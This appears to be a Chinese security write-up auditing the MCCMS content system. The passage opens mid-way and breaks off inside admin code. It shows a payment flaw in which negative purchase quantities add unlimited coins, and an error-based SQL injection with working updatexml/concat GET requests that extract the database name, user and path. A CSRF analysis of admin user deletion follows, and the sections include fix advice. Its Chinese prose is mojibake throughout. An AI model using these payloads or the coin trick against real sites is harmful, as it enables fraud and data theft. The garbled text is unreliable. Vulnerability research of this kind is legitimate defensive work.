<p><code>type=ticket&amp;rmb=1&amp;day=30&amp;num=1&amp;pay=cion</code><br>#å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„è´­ä¹°æ•°æ®å®Œå…¨æ˜¾ç¤ºå‡ºæ¥<br>type:è´­ä¹°çš„å•†å“ç±»å‹<br>rmb:èŠ±è´¹é‡‘é¢<br>day:è´­ä¹°ç‰©å“æ—¶é™<br>num:è´­ä¹°æ•°é‡<br>pay:æ”¯ä»˜æ–¹å¼</p>
</blockquote>
<p>å…ˆè¯•è¯•ä¿®æ”¹ä¸€ä¸‹è´­ä¹°æ•°é‡</p>
<p>ã€é‡‘å¸<code>10000</code>ï¼Œè´­ä¹°<code>1</code>å¼ æœˆç¥¨èŠ±<code>10</code>é‡‘å¸ï¼Œåº”è¯¥è¿˜å‰©<code>9990</code>ã€‘</p>
<p><img src="/post/CMS-Test/image-20221124141049742.png" alt="image-20221124141049742"></p>
<p>ã€é‡‘å¸<code>10000</code>ï¼Œè´­ä¹°<code>10</code>å¼ æœˆç¥¨èŠ±<code>100</code>é‡‘å¸ï¼Œåº”è¯¥è¿˜å‰©<code>9900</code>ã€‘</p>
<p><img src="/post/CMS-Test/image-20221124141119999.png" alt="image-20221124141119999"></p>
<p>ç„¶åæˆ‘ä»¬å†çœ‹çœ‹æˆ‘ä»¬çš„å‰©ä½™é‡‘é¢</p>
<p><img src="/post/CMS-Test/image-20221124141240128.png" alt="image-20221124141240128"></p>
<p>å‘ç°æ‰£äº†<code>200</code>é‡‘å¸ï¼ˆåº”è¯¥æ˜¯ä¸å°å¿ƒå‘äº†ä¸¤æ¬¡åŒ…ï¼‰</p>
<p>ã€è¿˜å‰©<code>9800</code>ã€‘</p>
<p>è™½ç„¶æ²¡æœ‰å®ç°æˆ‘ä»¬çš„ç›®çš„ï¼Œæ—¢ç„¶åœ¨æˆ‘ä»¬é‡‘é¢èƒ½æ‰¿å—èŒƒå›´å†…å¯ä»¥ï¼Œé‚£ä¹ˆè¯•è¯•è¶…è¿‡æˆ‘ä»¬é‡‘é¢ä»¥å¤–çš„å‘¢</p>
<p><img src="/post/CMS-Test/image-20221124141731975.png" alt="image-20221124141731975"></p>
<p><img src="/post/CMS-Test/image-20221124141845487.png" alt="image-20221124141845487"></p>
<p>å‘ç°æ˜¾ç¤ºé‡‘å¸ä¸å¤Ÿï¼Œæ—¢ç„¶æ­£å¸¸çš„æ•°æ®ä¸è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠæ•°é‡æ”¹æˆè´Ÿæ•°å‘¢</p>
<p><img src="/post/CMS-Test/image-20221124141931064.png" alt="image-20221124141931064"></p>
<p><img src="/post/CMS-Test/image-20221124141937935.png" alt="image-20221124141937935"></p>
<p>å±…ç„¶è´­ä¹°æˆåŠŸï¼Ÿ</p>
<p><img src="/post/CMS-Test/image-20221124142002433.png" alt="image-20221124142002433"></p>
<p>æˆ‘ä»¬å‘ç°æˆ‘ä»¬çš„æœˆç¥¨æ•°å‡å°‘äº†ï¼Œä½†æ˜¯é‡‘å¸æ•°å¢åŠ äº†ï¼Œè€Œä¸”æœˆç¥¨æ•°ä¸ºè´Ÿæ•°ï¼Œæ˜æ˜¾æ˜¯æœ‰é—®é¢˜çš„</p>
<p>åœ¨è´­ä¹°è®°å½•ä¸­ï¼Œæˆ‘ä»¬å‘ä¸‹ç¡®å®ä¹Ÿæœ‰è®°å½•</p>
<p><img src="/post/CMS-Test/image-20221124142151770.png" alt="image-20221124142151770"></p>
<p>è€Œè·å–é‡‘å¸çš„æ–¹å¼æœ¬æ¥åº”è¯¥æ˜¯é€šè¿‡<code>rmb</code>æ”¯ä»˜</p>
<p><img src="/post/CMS-Test/image-20221124142246178.png" alt="image-20221124142246178"></p>
<p>ä½†æ˜¯è¿™é‡Œé€šè¿‡ç®€å•çš„ä¿®æ”¹æœˆç¥¨æ•°ä¸ºè´Ÿæ•°ï¼Œå³å¯åå‘å¢åŠ é‡‘å¸æ•°é‡ï¼Œä¸”æ²¡æœ‰ä¸Šé™åˆ¶</p>
<p>è¿™é‡Œæˆ‘åˆæŠŠ<code>type</code>å’Œ<code>pay</code>ä¸¤è€…äº¤æ¢</p>
<p><img src="/post/CMS-Test/image-20221124142618960.png" alt="image-20221124142618960"></p>
<p><img src="/post/CMS-Test/image-20221124142629873.png" alt="image-20221124142629873"></p>
<p>å‘ç°ä¾æ—§è´­ä¹°æˆåŠŸï¼Œè¿˜æ˜¾ç¤ºè´­ä¹°<code>10</code>é‡‘å¸ï¼Œä½†æ˜¯æœˆç¥¨æ•°å¹¶æ²¡æœ‰å˜åŒ–ï¼Œè€Œé‡‘å¸å´å‡å°‘äº†ï¼Œåº”è¯¥æ˜¯æœˆç¥¨è½¬é‡‘å¸ä¸ç¬¦åˆé€»è¾‘ï¼Œä½†æ˜¯å‘çš„è¯·æ±‚åŒ…ä¸­çš„è¯­å¥ç¬¦åˆå……å€¼è¯­å¥ï¼Œäºæ˜¯æŒ‰ç…§è¯­æ³•ï¼Œæ‰£é™¤äº†<code>num</code>æ•°é‡çš„é‡‘å¸</p>
<p><img src="/post/CMS-Test/image-20221124142651295.png" alt="image-20221124142651295"></p>
<p>å½“æˆ‘åˆæ”¹æˆä¸”ä¿®æ”¹<code>rmb</code>æ”¹æˆ<code>1000</code></p>
<p><img src="/post/CMS-Test/image-20221124150939398.png" alt="image-20221124150939398"></p>
<p><img src="/post/CMS-Test/image-20221124151113186.png" alt="image-20221124151113186"></p>
<p>åœ¨äº¤æ˜“è®°å½•ä¸­æ˜¾ç¤ºå¢åŠ äº†<code>10000</code>é‡‘å¸ï¼Œä½†æ˜¯å®é™…é‡‘å¸æ˜¯åœ¨å‡å°‘</p>
<p><img src="/post/CMS-Test/image-20221124151205737.png" alt="image-20221124151205737"></p>
<p>è¿™æ˜¯å› ä¸ºä¸ç¬¦åˆå……å€¼é€»è¾‘</p>
<blockquote>
<p>å±å®³<br>é€šè¿‡è¯¥æ¼æ´ï¼Œå³å¯å¯¼è‡´é‡‘å¸ã€æœˆç¥¨ã€vipä¸‰è€…å¯ä»¥æ— é™åˆ¶</p>
</blockquote>
<h4 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h4><blockquote>
<p>è¯¥æ¼æ´çš„å½¢æˆçš„æ ¹æœ¬åŸå› åœ¨äº<br>åœ¨sys&#x2F;apps&#x2F;controllers&#x2F;api&#x2F;Pay.phpä¸­<br>1.å¯¹å®¢æˆ·ç«¯ç”¨æˆ·å¯æ§å‚æ•°çš„é™åˆ¶ä¸ç‰¢ï¼Œè€ƒè™‘ä¸å…¨ï¼Œ<br>2.å¯¹äºè´Ÿæ•°çš„æ¸…å†µï¼Œ<br>3.ä»¥åŠå¯¹ä¸åˆé€»è¾‘çš„æ”¯ä»˜æ–¹å¼çš„åˆ¤æ–­ä¸å¤Ÿ</p>
<p>å»ºè®®<br>1.å¯¹å®¢æˆ·ç«¯å¯æ§å‚æ•°è¿›è¡ŒåŠ å¯†ï¼Œè®©ç”¨æˆ·æ— æ³•ä¿®æ”¹å…¶å€¼<br>2.å¹¶ä¸”å¯¹å‚æ•°çš„åˆç†æ€§ä»¥åŠé€»è¾‘æ€§åŠ å¼ºåˆ¤æ–­ï¼Œå®Œå–„æ•´ä½“ä»£ç é€»è¾‘ï¼ŒåŠ å¼ºä¸åŒå‚æ•°ä¹‹é—´çš„è”ç³»ï¼Œä»¥åŠå‚æ•°å˜åŒ–å‰åçš„é€»è¾‘æ€§<br>3.æœ€å¥½ä¸è¦è®©ç”¨æˆ·èƒ½å¯¹å‘é€åˆ°æœåŠ¡å™¨çš„æ•°æ®è¿›è¡Œä¿®æ”¹æˆ–æ§åˆ¶</p>
</blockquote>
<h3 id="2-SQLæ³¨å…¥æ¼æ´"><a href="#2-SQLæ³¨å…¥æ¼æ´" class="headerlink" title="2.SQLæ³¨å…¥æ¼æ´"></a>2.SQLæ³¨å…¥æ¼æ´</h3><h4 id="ä»£ç åˆ†æ-æ¼æ´åˆ©ç”¨"><a href="#ä»£ç åˆ†æ-æ¼æ´åˆ©ç”¨" class="headerlink" title="ä»£ç åˆ†æ+æ¼æ´åˆ©ç”¨"></a>ä»£ç åˆ†æ+æ¼æ´åˆ©ç”¨</h4><p>è¿™é‡Œåˆ©ç”¨äº†<code>Acunetix</code>å¯¹ç«™ç‚¹æ‰«æï¼Œå‘ç°äº†åœ¨ä¸»é¡µå­˜åœ¨é«˜å±çš„<code>SQL</code>æ¼æ´</p>
<p><img src="/post/CMS-Test/image-20221126214707108.png" alt="image-20221126214707108"></p>
<p>å‘è¯·æ±‚åŒ…ï¼Œåå‘ç°å…¶å“åº”åŒ…çš„ç»“æœä¸ºæ•°æ®åº“æŠ¥é”™</p>
<p><img src="/post/CMS-Test/image-20221126214959756.png" alt="image-20221126214959756"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>A Database Error Occurred<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;body&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">              Error Number: 1064</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">     You have an error in your SQL syntax; check the manual that corresponds to     your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">              select  count(*) as counta from mc_book where yid=0 and pay=0 and serialize=&#x27;è¿è½½&#x27; and cid in(1&amp;#039) order by addtime desc</span><br><span class="line">              #å‘ç°1&#x27;è¢«æ’å…¥in()ä¸­</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">              Filename: D:/phpstudy_pro/WWW/127.0.0.3/sys/apps/models/Mcdb.php</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">          Line Number: 38</span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>äºæ˜¯å°è¯•å†<code>in()</code>ä¸­èƒ½å¦å®ç°é—­åˆå¹¶æ‰§è¡Œæ¶æ„<code>sql</code>è¯­å¥</p>
<p>ä½†æ˜¯åœ¨æºç ä¸­å¯¹sqlè¯­å¥æœ‰ä¸€å®šè¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/user/Category.php</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;BASEPATH&#x27;</span>) OR <span class="keyword">exit</span>(<span class="string">&#x27;No direct script access allowed&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Category</span> <span class="keyword">extends</span> <span class="title">Mccms_Controller</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ™ºèƒ½æ£€ç´¢</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$uri</span> = <span class="variable language_">$this</span>-&gt;uri-&gt;<span class="title function_ invoke__">uri_string</span>();</span><br><span class="line">        <span class="variable">$n</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$uri</span>,<span class="string">&#x27;/index&#x27;</span>) !== <span class="literal">false</span> ? <span class="number">3</span> : <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$this</span>-&gt;uri-&gt;<span class="title function_ invoke__">uri_to_assoc</span>(<span class="variable">$n</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;tpl-&gt;<span class="title function_ invoke__">category</span>(<span class="variable">$arr</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›<code>safe_replace</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//SQLè¿‡æ»¤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">			<span class="variable">$string</span>[<span class="title function_ invoke__">safe_replace</span>(<span class="variable">$k</span>)] = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$v</span>); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%20&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">            <span class="comment">/*   %20å¯ä»¥ç”¨+ä»£æ›¿   */</span></span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%27&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%2527&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&amp;#039;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;lt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;gt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\%&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_encode</span>(<span class="variable">$string</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å…ˆç®€å•æ„é€ ä¸€ä¸ª</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">GET</span> /index.php/book/category/order/addtime/pay/<span class="number">1</span>/finish/<span class="number">1</span>/list/<span class="number">1</span>)+order+by+<span class="number">5</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°æŠ¥é”™</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">ä»</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>select * from mc_book where yid=0 and pay=0 and serialize=&#x27;è¿è½½&#x27; and cid in(1&amp;#039) order by addtime desc<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">å˜æˆ</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Unknown column &#x27;5&#x27; in &#x27;order clause&#x27;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">ç”±ç¬¦å·æŠ¥é”™ï¼Œå˜æˆå‘½ä»¤æŠ¥é”™ï¼Œçœ‹æ¥æˆ‘ä»¬çš„sqlå‘½ä»¤åœ¨è¿™ä¸ªæ„é€ ä¸­æ˜¯å¯ä»¥æ‰§è¡Œçš„</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡<code>order by</code>ï¼Œåˆ¤æ–­å‡ºå½“å‰åˆ—æ•°åªæœ‰<code>1</code>åˆ—</p>
<p><img src="/post/CMS-Test/image-20221127003105524.png" alt="image-20221127003105524"></p>
<p><img src="/post/CMS-Test/image-20221127003130496.png" alt="image-20221127003130496"></p>
<p>æ­¤å¤„çš„æ³¨å…¥ç‚¹ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$k</span> == <span class="string">&#x27;list&#x27;</span>)&#123; <span class="comment">//åˆ†ç±»</span></span><br><span class="line">                   <span class="variable">$title</span>[] = <span class="variable">$data</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="title function_ invoke__">getzd</span>(<span class="string">&#x27;book_class&#x27;</span>,<span class="string">&#x27;name&#x27;</span>,<span class="variable">$v</span>);</span><br><span class="line">                   <span class="keyword">if</span>((<span class="keyword">int</span>)<span class="variable">$v</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                       <span class="variable">$cids</span> = <span class="title function_ invoke__">getcid</span>(<span class="variable">$v</span>);</span><br><span class="line">                       <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$cids</span>))&#123;</span><br><span class="line">                           <span class="variable">$sql</span> .= <span class="string">&quot; and cid in(&quot;</span>.<span class="variable">$cids</span>.<span class="string">&quot;)&quot;</span>;</span><br><span class="line">                       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                           <span class="variable">$sql</span> .= <span class="string">&quot; and cid=&quot;</span>.<span class="variable">$cids</span>;</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br></pre></td></tr></table></figure>

<p><code>$cid</code>å°±æ˜¯å¼•èµ·<code>sql</code>æ³¨å…¥çš„å‚æ•°ç‚¹</p>
<p>è·Ÿè¿›<code>getcid</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è§£æå¤šä¸ªåˆ†ç±»ID  å¦‚ cid=1,2,3,4,5,6</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getcid</span>(<span class="params"><span class="variable">$CID</span>,<span class="variable">$type</span>=<span class="string">&#x27;class&#x27;</span>,<span class="variable">$zd</span>=<span class="string">&#x27;fid&#x27;</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ci</span> = &amp;<span class="title function_ invoke__">get_instance</span>();</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$CID</span>))&#123;</span><br><span class="line">		<span class="variable">$ClassArr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$CID</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$ClassArr</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">			<span class="variable">$sql</span>=<span class="string">&quot;select id from &quot;</span>.Mc_SqlPrefix.<span class="variable">$type</span>.<span class="string">&quot; where &quot;</span>.<span class="variable">$zd</span>.<span class="string">&quot;=&#x27;<span class="subst">$ClassArr</span>[<span class="subst">$i</span>]&#x27;&quot;</span>;<span class="comment">//sqlè¯­å¥çš„ç»„ç»‡è¿”å›</span></span><br><span class="line">			<span class="variable">$result</span>=<span class="variable">$ci</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>)-&gt;<span class="title function_ invoke__">result</span>();</span><br><span class="line">			<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">				<span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">					<span class="variable">$ClassArr</span>[]=<span class="variable">$row</span>-&gt;id;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$CID</span>=<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$ClassArr</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$CID</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°è¯•åå‘ç°æ— æ³•è¿›è¡Œè”åˆæ³¨å…¥</p>
<p>åªèƒ½è¯•è¯•æŠ¥é”™æ³¨å…¥æˆ–è€…ç›²æ³¨</p>
<p>ç›²æ³¨è¯•äº†è¯•å‘ç°æ˜¯æ— æ³•å¾—åˆ°ååº”çš„</p>
<p>äºæ˜¯æˆ‘è¯•äº†è¯•æŠ¥é”™æ³¨å…¥</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">GET</span> /<span class="selector-tag">index</span><span class="selector-class">.php</span>/<span class="selector-tag">book</span>/<span class="selector-tag">category</span>/<span class="selector-tag">order</span>/<span class="selector-tag">addtime</span>/<span class="selector-tag">pay</span>/<span class="number">1</span>/<span class="selector-tag">finish</span>/<span class="number">1</span>/<span class="selector-tag">list</span>/<span class="number">1</span>)+<span class="selector-tag">and</span>+<span class="selector-tag">updatexml</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0</span>x7e,<span class="built_in">database</span>(),<span class="number">0</span>x7e,<span class="built_in">user</span>(),<span class="number">0</span>x7e,<span class="variable">@@datadir</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CMS-Test/image-20221127141028144.png" alt="image-20221127141028144"></p>
<p>æœç„¶æ˜¯æŠ¥é”™æ³¨å…¥ï¼Œæˆ‘ä»¬å¾—åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ï¼Œè™½ç„¶å› ä¸ºæŠ¥é”™å‡½æ•°é™åˆ¶äº†æ˜¾ç¤ºæ•°æ®å­—ç¬¦ä¸ªæ•°ï¼Œç”¨<code>substring</code>å³å¯</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">GET</span> /<span class="selector-tag">index</span><span class="selector-class">.php</span>/<span class="selector-tag">book</span>/<span class="selector-tag">category</span>/<span class="selector-tag">order</span>/<span class="selector-tag">addtime</span>/<span class="selector-tag">pay</span>/<span class="number">1</span>/<span class="selector-tag">finish</span>/<span class="number">1</span>/<span class="selector-tag">list</span>/<span class="number">1</span>)+<span class="selector-tag">and</span>+<span class="selector-tag">updatexml</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0</span>x7e,<span class="built_in">substring</span>(<span class="variable">@@datadir</span>,<span class="number">15</span>),<span class="number">0</span>x7e),<span class="number">1</span>)%<span class="number">23</span> </span><br></pre></td></tr></table></figure>

<p><img src="/post/CMS-Test/image-20221127141800552.png" alt="image-20221127141800552"></p>
<p>æœ€åå¾—åˆ°</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">æ•°æ®åº“å:mccms</span></span><br><span class="line"><span class="section">æ•°æ®åº“ç®¡ç†å‘˜åå­—:root</span></span><br><span class="line"><span class="section">æ•°æ®åº“è·¯å¾„: D:\phpstudy_pro\Extensions\MySQL8.0.12\data\</span></span><br></pre></td></tr></table></figure>

<h4 id="ä¿®å¤å»ºè®®-1"><a href="#ä¿®å¤å»ºè®®-1" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h4><blockquote>
<p>1.å¯¹ä»£å…¥sqlæŸ¥è¯¢è¯­å¥çš„å‚æ•°è¿›è¡Œä¸¥æ ¼è¿‡æ»¤<br>2.å‡å°‘ç”¨æˆ·å¯¹ä¼ å…¥sqlæŸ¥è¯¢çš„ä¸­å‚æ•°çš„ç›´æ¥æ§åˆ¶çš„æœºä¼š<br>3.å¯¹ä¸€äº›æ•°æ®å‡½æ•°ç¦æ­¢ç”¨ï¼Œæˆ–è€…å°‘ç”¨<br>4.æœ€å¥½ä¸è¦ç›´æ¥æŠŠç”¨æˆ·æ•°æ®å¸¦å…¥æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢</p>
</blockquote>
<h3 id="3-åå°ä¸€å¤„å®‰å…¨æ¼æ´"><a href="#3-åå°ä¸€å¤„å®‰å…¨æ¼æ´" class="headerlink" title="3.åå°ä¸€å¤„å®‰å…¨æ¼æ´"></a>3.åå°ä¸€å¤„å®‰å…¨æ¼æ´</h3><blockquote>
<p>åå°æ¼æ´<br>ä¸€èˆ¬çŒœæµ‹ä¸ºç™»å½•å­˜åœ¨sqlæ³¨å…¥ï¼Œæ¨¡æ¿æ³¨å…¥ï¼Œè¶Šæƒï¼Œå‘½ä»¤æ‰§è¡Œ,csrfç­‰ç­‰</p>
</blockquote>
<h4 id="ä»£ç åˆ†æ-1"><a href="#ä»£ç åˆ†æ-1" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><p>ç”±äºä¹‹å‰ä¿®å¤è¿‡<code>sql</code>æ³¨å…¥ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œçš„å¯èƒ½æ€§å°±å¾ˆå°‘äº†ï¼Œäºæ˜¯å¯¹å…¶ä»–æ¼æ´è¿›è¡Œæµ‹è¯•</p>
<p>ä¸è¿‡ï¼ŒæŠ“åŒ…è¿‡ç¨‹ä¸­å‘ç°å…¶ä¿¡æ¯çš†æ˜¯ä»¥æ˜æ–‡å½¢å¼å‘é€</p>
<p>æ‰€ä»¥çŒœæµ‹å­˜åœ¨<code>csrf</code></p>
<p>ã€å…ˆè¿›è¡Œäº†æ¼æ´æµ‹è¯•ã€‘</p>
<p>ä»¥æ­¤å¤„ä¸ºä¾‹</p>
<p>å¯¹<code>csrf</code>å®ç°æ§åˆ¶ç®¡ç†å‘˜åˆ é™¤ç”¨æˆ·ä»£ç åˆ†æ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/admin/User.php</span></span><br><span class="line"><span class="comment">//åˆ é™¤ä¼šå‘˜</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">del</span>(<span class="params"><span class="variable">$id</span>=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line"> 	    <span class="variable">$id</span> = (<span class="keyword">int</span>)<span class="variable">$id</span>;</span><br><span class="line"> 	    <span class="keyword">if</span>(<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line"> 	    	<span class="variable">$ids</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;id&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">/*get_postå…ˆæŸ¥çœ‹GETæ•°æ®ä¸­çš„idï¼Œå†æŸ¥çœ‹POSTæ•°æ®ä¸­çš„id</span></span><br><span class="line"><span class="comment">            è¿™é‡Œä¹Ÿæ˜¯æˆ‘ä»¬å®ç°csrfçš„å…³é”®å¤„ï¼Œ</span></span><br><span class="line"><span class="comment">            è¿™é‡Œçš„idä»¥æ˜æ–‡æ˜¾ç¤ºï¼Œä»¥æ˜æ–‡è¯»å–ï¼Œé‚£ä¹ˆåªè¦ä¿®æ”¹æ˜æ–‡ï¼Œä»»æ„çš„idéƒ½å¯ä»¥å®ç°è¿›è¡Œåç»­åˆ é™¤æ“ä½œ</span></span><br><span class="line"><span class="comment">            å¦‚æœå‰ç«¯å¯¹æ˜æ–‡æ•°æ®åŠ å¯†ï¼Œå†åœ¨è¿™é‡Œæ¯”è¾ƒåŒ¹å¯¹åï¼Œå†ä¼ å‚å¯èƒ½æ›´å®‰å…¨*/</span></span><br><span class="line">            </span><br><span class="line"> 	    	<span class="variable">$ids</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$ids</span>);</span><br><span class="line">            <span 